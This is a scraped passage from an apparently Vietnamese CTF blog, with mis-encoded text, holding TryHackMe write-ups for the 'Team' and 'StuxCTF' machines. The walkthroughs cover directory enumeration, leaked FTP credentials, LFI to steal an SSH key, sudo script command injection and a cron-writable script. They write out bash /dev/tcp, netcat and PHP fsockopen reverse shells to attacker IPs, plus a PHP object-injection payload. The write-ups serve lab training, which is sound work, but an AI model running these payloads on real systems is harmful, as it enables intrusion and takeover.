273B - /.html [04:06:10] 403 - 273B - /.htm [04:06:10] 403 - 273B - /.htpasswd_test [04:06:10] 403 - 273B - /.htpasswds [04:06:10] 403 - 273B - /.httr-oauth [04:06:13] 403 - 273B - /.php [04:06:46] 301 - 305B - /assets -\u0026gt; http://team.thm/assets/ [04:06:46] 403 - 273B - /assets/ [04:07:08] 200 - 755B - /images/ [04:07:08] 301 - 305B - /images -\u0026gt; http://team.thm/images/ [04:07:09] 200 - 3KB - /index.html [04:07:33] 200 - 5B - /robots.txt [04:07:34] 301 - 306B - /scripts -\u0026gt; http://team.thm/scripts/ [04:07:34] 403 - 273B - /scripts/ [04:07:35] 403 - 273B - /server-status [04:07:35] 403 - 273B - /server-status/ Khi thá»­ truy cáº­p vÃ o /assets vÃ  /scripts Ä‘á»u ra lá»—i 403 - khÃ´ng cÃ³ quyá»n truy cáº­p, cÃ³ nghÄ©a lÃ  tÃ´i khÃ´ng cÃ³ quyá»n truy cáº­p vÃ o path nÃ y Ä‘á»ƒ xem bÃªn trong cÃ³ nhá»¯ng file gÃ¬, nhÆ°ng náº¿u tÃ´i cÃ³ thá»ƒ tÃ¬m Ä‘Ãºng tÃªn file trong nÃ y thÃ¬ tÃ´i váº«n cÃ³ thá»ƒ xem Ä‘Æ°á»£c ná»™i dung cá»§a nÃ³.\nThá»­ dÃ¹ng dirsearch 1 láº§n ná»¯a vÃ  thÃªm path cÅ©ng nhÆ° Ä‘uÃ´i file, nhÆ°ng tÃ´i khÃ´ng hiá»ƒu vÃ¬ sao dÃ¹ng dirseach thÃ¬ khÃ´ng ra gÃ¬ mÃ  dÃ¹ng gobuster thÃ¬ sáº½ ra file script.txt\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ gobuster dir -u http://team.thm/scripts/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 100 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://team.thm/scripts/ [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2022/09/25 04:50:31 Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 273] /.htaccess.php (Status: 403) [Size: 273] /.hta.php (Status: 403) [Size: 273] /.htaccess.txt (Status: 403) [Size: 273] /.hta.txt (Status: 403) [Size: 273] /.htaccess (Status: 403) [Size: 273] /.htpasswd (Status: 403) [Size: 273] /.htpasswd.php (Status: 403) [Size: 273] /.htpasswd.txt (Status: 403) [Size: 273] /script.txt (Status: 200) [Size: 597] Truy cáº­p thá»­ vÃ o file nÃ y\n#!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; REDACTED read -sp \u0026#34;Enter Username Password: \u0026#34; REDACTED echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit # Updated version of the script # Note to self had to change the extension of the old \u0026#34;script\u0026#34; in this folder, as it has creds in ÄÃ¢y lÃ  1 file backup Ä‘Äƒng nháº­p ftp server, tÃ´i Ä‘á»ƒ Ã½ dÃ²ng cuá»‘i cÃ¹ng cÃ³ nÃ³i ráº±ng pháº£i thay Ä‘á»•i Ä‘uÃ´i cá»§a file script cÅ© vÃ¬ file nÃ y cÃ³ chá»©a thÃ´ng tin truy cáº­p, váº­y lÃ  file script cÅ© sáº½ cÃ³ tÃªn lÃ  script vÃ  Ä‘uÃ´i cÅ©??? \u0026#x1f4a9;\nVÃ  Ä‘Ãºng lÃ  Ä‘uÃ´i cÅ© tháº­t khi tÃ´i thá»­ /script.old vÃ  nÃ³ ra káº¿t quáº£\n#!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; ftpuser read -sp \u0026#34;Enter Username Password: \u0026#34; T3@m$h@r3 echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit Thá»­ truy cáº­p vÃ o ftp server\nftp\u0026gt; ls 200 EPRT command successful. Consider using EPSV. 150 Here comes the directory listing. drwxrwxr-x 2 65534 65534 4096 Jan 15 2021 workshare ftp\u0026gt; cd workshare 250 Directory successfully changed. ftp\u0026gt; ls -a 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxr-x 2 65534 65534 4096 Jan 15 21:25 . drwxr-xr-x 5 65534 65534 4096 Jan 15 21:25 .. -rwxr-xr-x 1 1002 1002 269 Jan 15 21:24 New_site.txt 226 Directory send OK. ftp\u0026gt; get New_site.txt - remote: New_site.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for New_site.txt (269 bytes). New_site.txt\nDale I have started coding a new website in PHP for the team to use, this is currently under development. It can be found at \u0026#34;.dev\u0026#34; within our domain. Also as per the team policy please make a copy of your \u0026#34;id_rsa\u0026#34; and place this in the relevent config file. Gyles TÃ´i sáº½ thá»­ thÃªm subdomain \u0026ldquo;dev\u0026rdquo; vÃ o file hosts vÃ  truy cáº­p láº¡i vÃ  dev.team.thmm\nThá»­ áº¥n vÃ o link vÃ  tÃ´i Ä‘Æ°á»£c chuyá»ƒn sang 1 trang khÃ¡c\nNhÃ¬n vÃ o url thÃ¬ tÃ´i nghÄ© ngay Ä‘áº¿n PHP LFI. Má»Ÿ Burpsuite Ä‘á»ƒ báº¯t request vÃ  thay Ä‘á»•i teamshare.php thÃ nh file muá»‘n má»Ÿ\nVá»›i file passwd tÃ´i cÃ³ 2 user á»Ÿ Ä‘Ã¢y lÃ  dale vÃ  gyles. Thá»±c ra thÃ¬ náº¿u Ä‘á»ƒ tÃ¬m user flag vá»›i lá»— há»•ng nÃ y, tÃ´i cÃ³ thá»ƒ thá»­ cÃ¡c path Ä‘á»ƒ xem file user.txt náº±m á»Ÿ Ä‘Ã¢u vÃ  xem Ä‘Æ°á»£c ná»™i dung cá»§a nÃ³. Tuy nhiÃªn vá»›i má»¥c Ä‘Ã­ch cÃ³ thá»ƒ leo thá»±c thi RCE vÃ  leo thang Ä‘áº·c quyá»n thÃ¬ tÃ´i sáº½ thá»­ cÃ¡ch khÃ¡c.\nQuay láº¡i vá»›i file txt mÃ  tÃ´i cÃ³ phÃ­a trÃªn, tÃ´i cÃ³ 1 key ssh bÃªn trong file config nÃ o Ä‘Ã³. ThÆ°á»ng thÃ¬ trong /etc/ cá»§a Ubuntu sáº½ cÃ³ tá»‡p ssh chá»©a file config, nÃªn tÃ´i sáº½ thá»­ cáº§u may 1 chÃºt xem cÃ³ file nÃ y trong mÃ¡y chá»§ má»¥c tiÃªu hay khÃ´ng, thÃªm ná»¯a Ä‘Ã¢y lÃ  1 machine má»©c Easy nÃªn tÃ´i nghÄ© sáº½ khÃ´ng cÃ³ quÃ¡ nhiá»u thay Ä‘á»•i vá»›i cÃ¡c file Ä‘Ã£ cÃ³ sáºµn\nÄÃºng nhÆ° tÃ´i nghÄ©, báº£n copy cá»§a id_rsa náº±m trong nÃ y. Sao chÃ©p nÃ³ vá», xÃ¡o cÃ¡c dáº¥u # vÃ  thá»­ login ssh báº±ng key nÃ y\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh -i id_rsa dale@10.10.133.54 The authenticity of host \u0026#39;10.10.133.54 (10.10.133.54)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:33en2c6AmAEzI4zDeUH4EyLRpyzjrXxptkcSHBnTVbA. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.133.54\u0026#39; (ED25519) to the list of known hosts. Last login: Mon Jan 18 10:51:32 2021 dale@TEAM:~$ id uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors) dale@TEAM:~$ dale@TEAM:~$ ls user.txt dale@TEAM:~$ Privilege escalation # sudo -l\ndale@TEAM:~$ sudo -l Matching Defaults entries for dale on TEAM: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dale may run the following commands on TEAM: (gyles) NOPASSWD: /home/gyles/admin_checks dale@TEAM:~$ Check qua file admin_checks thÃ¬ Ä‘Ã¢y lÃ  1 file script\ndale@TEAM:~$ cd /home/gyles/ dale@TEAM:/home/gyles$ cat admin_checks #!/bin/bash printf \u0026#34;Reading stats.\\n\u0026#34; sleep 1 printf \u0026#34;Reading stats..\\n\u0026#34; sleep 1 read -p \u0026#34;Enter name of person backing up the data: \u0026#34; name echo $name \u0026gt;\u0026gt; /var/stats/stats.txt read -p \u0026#34;Enter \u0026#39;date\u0026#39; to timestamp the file: \u0026#34; error printf \u0026#34;The Date is \u0026#34; $error 2\u0026gt;/dev/null date_save=$(date \u0026#34;+%F-%H-%M\u0026#34;) cp /var/stats/stats.txt /var/stats/stats-$date_save.bak printf \u0026#34;Stats have been backed up\\n\u0026#34; dale@TEAM:/home/gyles$ Khi nháº­p trÆ°á»ng $name, nÃ³ sáº½ ghi vÃ o file stats.txt, cÃ²n nháº­p trÆ°á»ng $date thÃ¬ nÃ³ sáº½ ghi vÃ o biáº¿n \u0026rsquo;error\u0026rsquo; vÃ  thá»±c thi nÃ³ error 2\u0026gt;/dev/null\ndale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks Reading stats. Reading stats.. Enter name of person backing up the data: hihi Enter \u0026#39;date\u0026#39; to timestamp the file: The Date is Stats have been backed up dale@TEAM:/home/gyles$ cat /var/stats/stats.txt Website_views=1337 Unique_views=436 Disc_members=16 Events_won=1 anon anon anon anon anon anon anon anon anon hihi dale@TEAM:/home/gyles$ Thay vÃ¬ nháº­p ngÃ y thÃ¡ng thÃ¬ tÃ´i sáº½ nháº­p 1 injection Ä‘Æ¡n giáº£n\ndale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks Reading stats. Reading stats.. Enter name of person backing up the data: gyles Enter \u0026#39;date\u0026#39; to timestamp the file: /bin/bash -i The Date is uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin) gyles Khi nháº­p command thÃ¬ nÃ³ sáº½ hiá»‡n káº¿t quáº£ chá»© khÃ´ng hiá»‡n dá»¯ liá»‡u tÃ´i nháº­p vÃ o, config láº¡i shell vá»›i python: python3 -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\ngyles@TEAM:~$ ls user.txt gyles@TEAM:~$ pwd /home/dale gyles@TEAM:~$ cd /home/gyles gyles@TEAM:~$ gyles@TEAM:/home/gyles$ ls -la total 48 drwxr-xr-x 6 gyles gyles 4096 Jan 17 2021 . drwxr-xr-x 5 root root 4096 Jan 15 2021 .. -rwxr--r-- 1 gyles editors 399 Jan 15 2021 admin_checks -rw------- 1 gyles gyles 5639 Jan 17 2021 .bash_history -rw-r--r-- 1 gyles gyles 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 gyles gyles 3771 Apr 4 2018 .bashrc drwx------ 2 gyles gyles 4096 Jan 15 2021 .cache drwx------ 3 gyles gyles 4096 Jan 15 2021 .gnupg drwxrwxr-x 3 gyles gyles 4096 Jan 15 2021 .local -rw-r--r-- 1 gyles gyles 807 Apr 4 2018 .profile drwx------ 2 gyles gyles 4096 Jan 15 2021 .ssh -rw-r--r-- 1 gyles gyles 0 Jan 17 2021 .sudo_as_admin_successful Thá»­ xem file .bash_history vÃ¬ tÃ´i tháº¥y dung lÆ°á»£ng cá»§a nÃ³ khÃ¡ lá»›n. PhÃ¢n tÃ­ch qua file nÃ y thÃ¬ tÃ´i Ä‘á»ƒ Ã½ tháº¥y cÃ³ 1 thÆ° má»¥c mÃ  user nÃ y sá»­ dá»¥ng Ä‘á»ƒ thá»±c hiá»‡n netcat trÃªn quyá»n root\nsu root cd /opt/admin_stuff/ ls -la id clear ./nc -e /bin/bash 192.168.88.128 4444 ls -la sudo chmod g+s nc ls ls -la ./nc -e /bin/bash 192.168.88.128 4444 ls -la cat /etc/crontab php which php ls -la php -r \u0026#39;$sock=fsockopen(\u0026#34;192.168.88.128\u0026#34;,4444);exec (\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; exit Äi Ä‘áº¿n thÆ° má»¥c nÃ y\ngyles@TEAM:/home/gyles$ ls /opt/admin_stuff/ script.sh gyles@TEAM:/home/gyles$ cat /opt/admin_stuff/script.sh #!/bin/bash #I have set a cronjob to run this script every minute dev_site=\u0026#34;/usr/local/sbin/dev_backup.sh\u0026#34; main_site=\u0026#34;/usr/local/bin/main_backup.sh\u0026#34; #Back ups the sites locally $main_site $dev_site gyles@TEAM:/home/gyles$ Kiá»ƒm tra qua 2 file dev_backup.sh vÃ  main_backup.sh, tÃ´i Ä‘á»ƒ Ã½ tháº¥y file main_backup.sh cÃ³ thá»ƒ chá»‰nh sá»­a Ä‘Æ°á»£c vá»›i user gyles vÃ¬ cÃ¹ng náº±m trong group admin\ngyles@TEAM:/home/gyles$ ls -la /usr/local/sbin/dev_backup.sh -rwxr-xr-x 1 root root 64 Jan 17 2021 /usr/local/sbin/dev_backup.sh gyles@TEAM:/home/gyles$ ls -la /usr/local/bin/main_backup.sh -rwxrwxr-x 1 root admin 65 Jan 17 2021 /usr/local/bin/main_backup.sh gyles@TEAM:/home/gyles$ Táº¡o listener vá»›i port 2402: nc -lnvp 2402\nThÃªm payload vÃ o file main_backup.sh\ngyles@TEAM:/home/gyles$ cat /usr/local/bin/main_backup.sh #!/bin/bash /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.18.3.74/2402 0\u0026gt;\u0026amp;1 â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.27.48] 48290 bash: cannot set terminal process group (1968): Inappropriate ioctl for device bash: no job control in this shell root@TEAM:~# id id uid=0(root) gid=0(root) groups=0(root),1004(admin) root@TEAM:~# ls /root ls /root root.txt root@TEAM:~# ","date":"4 March 2022","externalUrl":null,"permalink":"/ctf/tryhackme/team/","section":"Ctf","summary":"","title":"Tryhackme - Team","type":"ctf"},{"content":"","date":"2 March 2022","externalUrl":null,"permalink":"/tags/diffie-hellman/","section":"Tags","summary":"","title":"Diffie Hellman","type":"tags"},{"content":"","date":"2 March 2022","externalUrl":null,"permalink":"/tags/php-object-injection/","section":"Tags","summary":"","title":"Php Object Injection","type":"tags"},{"content":"Xin chÃ o, dáº¡o nÃ y báº­n quÃ¡ nÃªn bÃ¢y giá» tÃ´i má»›i quay láº¡i lÃ m CTF Ä‘Æ°á»£c. HÃ´m nay tÃ´i sáº½ trá»Ÿ láº¡i vá»›i 1 CTF má»©c Easy Tryhackme - StuxCTF\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ trÃªn mÃ¡y chá»§ má»¥c tiÃªu.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e8:da:b7:0d:a7:a1:cc:8e:ac:4b:19:6d:25:2b:3e:77 (RSA) | 256 c1:0c:5a:db:6c:d6:a3:15:96:85:21:e9:48:65:28:42 (ECDSA) |_ 256 0f:1a:6a:d1:bb:cb:a6:3e:bd:8f:99:8d:da:2f:30:86 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/StuxCTF/ |_http-title: Default Page |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Thá»­ vÃ o web vá»›i port 80, khÃ´ng cÃ³ gÃ¬ ngoÃ i 2 chá»¯ is blank, nhÆ°ng khi tÃ´i kiá»ƒm tra source web thÃ¬ má»›i cÃ³ vÃ i thá»© hay ho.\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Default Page\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- The secret directory is... p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251; g: 7; a: 330; b: 450; g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617; --\u0026gt; is blank.... \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; CÃ³ váº» nhÆ° Ä‘Ã¢y lÃ  má»™t dáº¡ng thuáº­t toÃ¡n nÃ o Ä‘Ã³, nhÆ°ng vÃ¬ chÆ°a cÃ³ gá»£i Ã½ nÃ o nÃªn tÃ´i sáº½ quay láº¡i vá»›i nÃ³ sau.\nTiáº¿p theo thÃ¬ vÃ o /robots.txt\nKhi truy cáº­p thá»­ vÃ o /StuxCTF/ thÃ¬ web bÃ¡o khÃ´ng tÃ¬m tháº¥y path nÃ y. Dá»«ng khoáº£ng chá»«ng lÃ  2s thÃ¬ tÃ´i Ä‘á»ƒ Ã½ tháº¥y Diffie_Hellman, nghe giá»‘ng 1 cÃ¡i tÃªn. Thá»­ tÃ¬m kiáº¿m nÃ³ trÃªn máº¡ng vÃ  hÃ³a ra Ä‘Ã¢y lÃ  tÃªn 1 phÆ°Æ¡ng phÃ¡p trao Ä‘á»•i khÃ³a, nÃ³ á»Ÿ Ä‘Ã¢y\nSau khoáº£ng vÃ i tiáº¿ng thÃ´ng nÃ£o thuáº­t toÃ¡n vÃ  thÃªm pháº§n hint trong CTF thÃ¬ tÃ´i cÅ©ng tÃ¬m tÃ­nh Ä‘Æ°á»£c ra khÃ³a Ä‘áº·c biá»‡t cuá»‘i cÃ¹ng. CÅ©ng á»Ÿ trong pháº§n hint, Ä‘á»™ dÃ i cá»§a directory lÃ  128 kÃ½ tá»± Ä‘áº§u nÃªn khi in ra mÃ n hÃ¬nh tÃ´i sáº½ chuyá»ƒn káº¿t quáº£ vá» dáº¡ng string vÃ  chá»‰ láº¥y 128 kÃ½ tá»± Ä‘áº§u. Sá»­ dá»¥ng python thÃ¬ nÃ³ sáº½ nhÆ° tháº¿ nÃ y:\np = 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251 g = 7 a = 330 b = 450 gc = 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617 gca = (gc**a) % p gcab = (gca**b) % p print (str(gcab)[:128]) Truy cáº­p web vá»›i path lÃ  káº¿t quáº£ vá»«a tÃ¬m Ä‘Æ°á»£c.\nLáº¡i thá»­ kiá»ƒm tra source web xem cÃ³ hint nÃ o ná»¯a khÃ´ng\n\u0026lt;!-- hint: /?file= --\u0026gt;\nVá»›i hint nÃ y thÃ¬ kháº£ nÄƒng cao lÃ  PHP LFI exploit. TÃ´i sáº½ dÃ¹ng BurpSuite Ä‘á»ƒ sá»­a request dá»… hÆ¡n. Sau 1 lÃºc thá»­ cÃ¡c kiá»ƒu LFI Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£, tÃ´i nháº­n ra mÃ¬nh Ä‘Ã£ hiá»ƒu sai hint nÃ y. Vá»›i PHP LFI tÃ´i pháº£i Ä‘á»ƒ index.php á»Ÿ Ä‘áº§u vÃ  sau Ä‘Ã³ lÃ  /?file=, nhÆ°ng thá»±c ra trong hint khÃ´ng Ä‘á» cáº­p Ä‘áº¿n index.php nÃªn path sáº½ chá»‰ cÃ³ /?file= vÃ  tÃªn file Ä‘áº±ng sau\nSao chÃ©p Ä‘oáº¡n hex nÃ y vÃ o CyberChef vÃ  tÃ´i cÃ³ 1 Ä‘oáº¡n mÃ£ trÃ´ng giá»‘ng base64 nhÆ°ng bá»‹ Ä‘áº£o ngÆ°á»£c vÃ¬ dáº¥u = xuáº¥t hiá»‡n á»Ÿ Ä‘áº§u Ä‘oáº¡n mÃ£ chá»© khÃ´ng pháº£i pháº§n Ä‘uÃ´i nhÆ° thÃ´ng thÆ°á»ng.\nSau khi dá»‹ch ngÆ°á»£c Ä‘oáº¡n base64 vÃ  giáº£i mÃ£ thÃ¬ tÃ´i sáº½ cÃ³ source cá»§a index.php\n\u0026lt;br /\u0026gt; error_reporting(0);\u0026lt;br /\u0026gt; class file {\u0026lt;br /\u0026gt; public $file = \u0026#34;dump.txt\u0026#34;;\u0026lt;br /\u0026gt; public $data = \u0026#34;dump test\u0026#34;;\u0026lt;br /\u0026gt; function __destruct(){\u0026lt;br /\u0026gt; file_put_contents($this-\u0026gt;file, $this-\u0026gt;data);\u0026lt;br /\u0026gt; }\u0026lt;br /\u0026gt; }\u0026lt;br /\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;br /\u0026gt; $file_name = $_GET[\u0026#39;file\u0026#39;];\u0026lt;br /\u0026gt; if(isset($file_name) \u0026amp;\u0026amp; !file_exists($file_name)){\u0026lt;br /\u0026gt; echo \u0026#34;File no Exist!\u0026#34;;\u0026lt;br /\u0026gt; }\u0026lt;br /\u0026gt; \u0026lt;br /\u0026gt; if($file_name==\u0026#34;index.php\u0026#34;){\u0026lt;br /\u0026gt; $content = file_get_contents($file_name);\u0026lt;br /\u0026gt; $tags = array(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;);\u0026lt;br /\u0026gt; echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, \u0026#34;\u0026#34;, $content)))));\u0026lt;br /\u0026gt; }\u0026lt;br /\u0026gt; unserialize(file_get_contents($file_name));\u0026lt;br /\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;!DOCTYPE html\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;head\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;title\u0026gt;StuxCTF\u0026lt;/title\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;assets/css/bootstrap.min.css\u0026#34; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;assets/css/style.css\u0026#34; /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;body\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-default navbar-fixed-top\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;navbar-toggle collapsed\u0026#34; data-toggle=\u0026#34;collapse\u0026#34; data-target=\u0026#34;#navbar\u0026#34; aria-expanded=\u0026#34;false\u0026#34; aria-controls=\u0026#34;navbar\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;span class=\u0026#34;sr-only\u0026#34;\u0026gt;Toggle navigation\u0026lt;/span\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/button\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;index.php\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/nav\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;!-- hint: /?file= --\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;div class=\u0026#34;jumbotron\u0026#34;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;center\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;h1\u0026gt;Follow the white rabbit..\u0026lt;/h1\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/center\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/div\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;script src=\u0026#34;assets/js/jquery-1.11.3.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;script src=\u0026#34;assets/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;/html\u0026gt;\u0026lt;br /\u0026gt; LÆ°á»›t qua source nÃ y, tÃ´i Ä‘á»ƒ Ã½ cÃ³ 1 function cÃ³ thá»ƒ khai thÃ¡c Ä‘Æ°á»£c, Ä‘Ã³ lÃ  unserialize. Lá»—i nÃ y liÃªn quan Ä‘áº¿n dá»¯ liá»‡u Ä‘áº§u vÃ o mÃ  ngÆ°á»i dÃ¹ng nháº­p khÃ´ng Ä‘Æ°á»£c kiá»ƒm duyá»‡t trÆ°á»›c khi Ä‘áº¿n hÃ m unserialize tá»« Ä‘Ã³ cÃ³ thá»ƒ cho phÃ©p thá»±c hiá»‡n RCE\nÄá»c thÃªm: PHP Object Injection\nÄáº§u tiÃªn, tÃ´i táº¡o 1 file php vá»›i ná»™i dung dÃ¹ng Ä‘á»ƒ táº¡o 1 file php khÃ¡c cÃ³ chá»©a payload. Sau Ä‘Ã³ dÃ¹ng php Ä‘á»ƒ chuyá»ƒn nÃ³ thÃ nh file txt. Sau khi táº£i file text nÃ y lÃªn web server, Ä‘i qua hÃ m unserialize, nÃ³ sáº½ phÃ¢n giáº£i ná»™i dung thÃ nh file php vÃ  thá»±c thi cÃ¢u lá»‡nh bÃªn trong file Ä‘Ã³. Theo tÃ´i hiá»ƒu thÃ¬ lÃ  nhÆ° váº­y \u0026#x1f627; Hi vá»ng tÃ´i khÃ´ng hiá»ƒu sai.\nFile php Ä‘Æ°á»£c táº¡o sáº½ trong nhÆ° tháº¿ nÃ y\n\u0026lt;?php class file { public $file = \u0026#39;test.php\u0026#39;; public $data = \u0026#39;\u0026lt;?php shell_exec(\u0026#34;nc -e /bin/bash 10.18.3.74 9001\u0026#34;); ?\u0026gt;\u0026#39;; } echo (serialize(new file)); ?\u0026gt; Sau Ä‘Ã³ sá»­ dá»¥ng php Ä‘á»ƒ chuyá»ƒn file nÃ y thÃ nh text\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ php serialize.php \u0026gt; test.txt â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat test.txt O:4:\u0026#34;file\u0026#34;:2:{s:4:\u0026#34;file\u0026#34;;s:11:\u0026#34;test.php\u0026#34;;s:4:\u0026#34;data\u0026#34;;s:55:\u0026#34;\u0026lt;?php shell_exec(\u0026#34;nc -e /bin/bash 10.18.3.74 9001\u0026#34;); ?\u0026gt;\u0026#34;;} Tiáº¿p theo táº¡o local http server báº±ng python\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Sau Ä‘Ã³ thá»±c hiá»‡n request láº¥y file test.txt vá» server. TÃ´i dÃ¹ng BurpSuite\nTuy web hiá»‡n File no Exist! nhÆ°ng khi kiá»ƒm tra láº¡i http server thÃ¬ tÃ´i tháº¥y file Ä‘Ã£ Ä‘Æ°á»£c táº£i lÃªn\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.249.167 - - [22/Sep/2022 23:03:57] \u0026#34;GET /test.txt HTTP/1.0\u0026#34; 200 - Táº¡o listener vá»›i port 9001 nc -lnvp 9001\nThá»­ truy cáº­p vÃ o file test.php\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.18.3.74] from (UNKNOWN) [10.10.107.75] 44226 id uid=33(www-data) gid=33(www-data) groups=33(www-data) config láº¡i shell vá»›i python\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@ubuntu:/$ export TERM=xterm www-data@ubuntu:/$ VÃ  sau Ä‘Ã³ tÃ´i tÃ¬m tháº¥y user flag trong thÆ° má»¥c user grecia\nwww-data@ubuntu:/$ ls /home grecia www-data@ubuntu:/$ 